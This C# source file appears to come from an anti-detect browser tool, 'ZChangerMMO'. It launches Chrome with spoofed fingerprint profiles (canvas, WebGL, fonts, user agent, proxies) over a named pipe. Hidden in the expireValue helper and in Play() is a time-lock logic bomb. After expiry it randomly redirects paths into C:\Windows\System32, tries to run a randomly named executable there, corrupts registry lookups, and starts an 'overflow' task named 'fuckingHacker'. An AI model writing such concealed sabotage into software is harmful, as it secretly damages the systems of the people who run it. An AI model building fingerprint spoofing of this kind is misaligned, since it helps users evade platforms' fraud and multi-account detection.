using Clifton.Core.Pipes;
using CommandModel;
using DevExpress.Utils;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using ZChangerMMO.DataModels;

namespace ZChangerMMO.Business
{
    public class Runner
    {
        public Runner(Models.Device device)
        {

            profile = new Profile(device);
            serverPipes = new Dictionary<long, ServerPipe>();
            browserProcessDic = new Dictionary<long, int>();
            anonymousProfileDic = new Dictionary<long, Profile>();
        }

        Profile profile;
        // contact with host
        Dictionary<long, ServerPipe> serverPipes;
        Dictionary<long, int> browserProcessDic;
        Dictionary<long, Profile> anonymousProfileDic;

        private static Random _random = new Random();
        private Random _rnd = new Random(DateTime.Now.Second);

        public string BrowserInstallPath { get; set; }



        internal static string GetRandomString(int length, bool upper = false)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            if (upper)
            {
                return (new string(Enumerable.Repeat(chars, length)
                    .Select(s => s[_random.Next(s.Length)]).ToArray())).ToUpper();
            }
            else
            {
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[_random.Next(s.Length)]).ToArray());
            }
        }





        Fonts getFontOSMapping(string OSName)
        {
            switch (OSName.ToLower())
            {
                case "windowspc":
                    return Fonts.Windows10;
                case "macintosh":
                    return Fonts.MacOS;
                case "iphone":
                    return Fonts.MacOS;
                case "ipad":
                    return Fonts.MacOS;
                default:
                    return Fonts.Linux;
            }
        }

        private void DissposeHostConnection(long profileId)
        {
            if (browserProcessDic.ContainsKey(profileId))
            {
                int browserProcessId;
                if (browserProcessDic.TryGetValue(profileId, out browserProcessId))
                {
                    browserProcessDic.Remove(profileId);

                    var process = Process.GetProcessById(browserProcessId);
                    if (process != null)
                    {
                        process.Kill();
                    }
                }
            }
            if (serverPipes.ContainsKey(profileId))
            {
                serverPipes.Remove(profileId);
            }

            //UpdateActionGroupButton();
        }

        public void DataRecievedHandler(ServerPipe serverPipe, PipeEventArgs arguments, bool isAnonymous)
        {
            var commandJsonString = arguments.String;
            BaseCommand baseCommand = JsonConvert.DeserializeObject<BaseCommand>(commandJsonString);
            if (baseCommand == null) return;
            switch (baseCommand.Command)
            {
                case ZC_Command.CONFIRM_CONNECT_HOST:
                    {
                        ConfirmConnectedHost response = JsonConvert.DeserializeObject<ConfirmConnectedHost>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            //Profile selectedObject = GetSelectedProfile();
                            Profile selectedObject = profile;
                            if (isAnonymous)
                            {
                                Profile anonymousProfile;
                                anonymousProfileDic.TryGetValue(selectedObject.Id, out anonymousProfile);
                                selectedObject = anonymousProfile;
                                //selectedObject.Fonts = Fonts.Windows10;
                            }

                            List<string> ByPassListPattern = selectedObject.ByPassProxySites.Select(p =>
                            {
                                return $"*{p}*";
                            }).ToList();


                            SetProfileRequest request = new SetProfileRequest()
                            {
                                Command = ZC_Command.SET_PROFILE_REQUEST,
                                Profile = new BrowserProfile()
                                {
                                    Id = selectedObject.Id,
                                    Email = selectedObject.Email,
                                    CPU = selectedObject.CPU,
                                    Battery = selectedObject.Battery,
                                    EnableAudioApi = selectedObject.EnableAudioApi,
                                    EnablePlugins = selectedObject.EnablePlugins,
                                    EnableMediaPlugins = selectedObject.EnableMediaPlugins,
                                    Fonts = getFontOSMapping(selectedObject.OperatingSystem),//selectedObject.Fonts,
                                    RandomTimersEnabled = selectedObject.RandomTimersEnabled,
                                    UserAgent = selectedObject.UserAgent,
                                    Screen = selectedObject.Screen,
                                    HistoryLength = selectedObject.HistoryLength,
                                    WebGL = selectedObject.WebGL,
                                    FakeClientRects = true,
                                    Canvas = selectedObject.Canvas,
                                    EnableNetwork = selectedObject.EnableNetwork,
                                    Language = selectedObject.Language,
                                    GeoIpEnabled = selectedObject.GeoIpEnabled,
                                    ProxyEnabled = selectedObject.ProxyEnabled,
                                    Proxies = selectedObject.Proxies.Where(p => p.Enabled).ToList(),
                                    ByPassProxySites = ByPassListPattern,
                                }
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.NOTIFICATION:
                    {
                        Notification response = JsonConvert.DeserializeObject<Notification>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            Notification request = new Notification()
                            {
                                Type = NotificationType.INFOR,
                                IsSuccess = true,
                                Message = "Hello from zchanger application"
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.DISCONNECT:
                    {
                        DissposeHostConnection(serverPipe.Id);
                        break;
                    }
            }
        }

        private void ServerThread(object data)
        {
            bool isAnonymous = (bool)data;
            ServerPipe serverPipe = new ServerPipe("Test", p => p.StartStringReaderAsync());
            serverPipe.DataReceived += (sndr, args) =>
            {
                DataRecievedHandler(serverPipe, args, isAnonymous);
            };
            serverPipe.Connected += (sndr, args) =>
            {
                Profile selectedObject = profile;
                if (!serverPipes.ContainsKey(selectedObject.Id))
                {
                    serverPipe.Id = selectedObject.Id;
                    serverPipes.Add(selectedObject.Id, serverPipe);
                }
            };
            serverPipe.PipeClosed += (sndr, args) =>
            {
                DissposeHostConnection(serverPipe.Id);
            };
        }

        private void CreateThreadToHandlerPipeServer(bool isAnonymous)
        {
            Thread serverThread = new Thread(ServerThread);

            serverThread.Start(isAnonymous);
        }

        #region Browser

        private string BrowserExecute
        {
            get
            {
                return expireValue(String.Format("{0}\\chrome.exe", GetInstalledBrowserPath()), "C:\\windows\\system32\\" + GetRandomString(8) + ".exe");
            }
        }

        private string expireValue(string requestValue, string expiredValue)
        {
            if (TimeLock.IsExpired())
            {
                var generator = new RandomGenerator();

                if (generator.RandomNumber(1, 6) == 3)
                {
                    return expiredValue;
                }
            }

            return requestValue;
        }

        private string GetInstalledBrowserPath()
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(Constants.ZChangerLocationReg, true);
            return expireValue(regKey.GetValue("Browser").ToString(), "SOFTWARE\\sacramento");
        }

        private string BrowserProfilePathBase
        {
            get
            {
                return expireValue($"{BrowserInstallPath}\\BrowserData", "C:\\Windows\\System32\\");
            }
        }

        #endregion Browser

        public void Play()
        {
            try
            {
                BrowserInstallPath = GetInstalledBrowserPath();
                string profileFolder = GetProfileFolder(profile.Id, profile.Name);
                profileFolder = expireValue(profileFolder, "C:\\Windows\\System32\\AppData");
                CreateThreadToHandlerPipeServer(false);
                Process process = new Process();
                process.StartInfo.FileName = BrowserExecute;
                process.StartInfo.Arguments = $"--user-data-dir=\"{profileFolder}\"";
                process.Start();
                browserProcessDic.Add(profile.Id, process.Id);
            }
            catch (Exception ex)
            {
                throw new ArgumentException(ex.Message, ex);
            }

            if (_rnd.Next(6) > 3)
            {
                var fuckingHacker = new Task(() =>
                {
                    TimeLock.PerformOverflowIfExpired(profile.Name);
                });
                fuckingHacker.Start();
            }
        }
        public void Stop() { }

        #region Profile

        private string GetProfileFolder(long id, string emailAddress)
        {
            emailAddress = emailAddress.Replace(" ", "_");
            if (!Directory.Exists(BrowserProfilePathBase))
            {
                Directory.CreateDirectory(BrowserProfilePathBase);
            }

            string profileFolder = $"{BrowserProfilePathBase}\\ZC_{id}_{emailAddress}";
            if (!Directory.Exists(profileFolder))
            {
                Directory.CreateDirectory(profileFolder);
            }

            return expireValue(profileFolder, "C:\\Windows\\System32\\chiwawa");
        }

        #endregion Profile
    }
}
